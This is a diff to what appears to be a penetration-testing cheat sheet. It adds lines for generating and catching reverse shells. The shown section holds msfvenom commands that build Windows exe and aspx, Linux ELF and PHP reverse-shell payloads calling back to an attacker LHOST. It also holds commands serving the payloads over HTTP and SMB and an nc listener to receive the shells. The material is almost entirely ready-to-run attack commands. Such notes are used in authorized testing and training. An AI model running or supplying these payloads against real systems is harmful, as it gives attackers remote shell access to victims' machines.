@@ -75,8 +75,10 @@ Generate architecture-appropriate payloads when a native executable is needed:
 ```bash
 # Generate native reverse-shell payloads for the target platform
 msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f asp -o shell.aspx
 msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o shell.elf
 msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -f raw -o shell.php
+chmod +x shell.elf
 ```
 
 ### Serve files from Kali
@@ -86,6 +88,12 @@ msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -f raw -o shell.php
 python3 -m http.server 8000 --directory .
 sudo impacket-smbserver share "$PWD" -smb2support
 sudo impacket-smbserver share "$PWD" -smb2support -username "$USER" -password "$PASS"
+```
+
+Start the listener before triggering a reverse-shell payload:
+
+```bash
+rlwrap nc -lvnp "$LPORT"
 ```
 
 ### Download to Linux
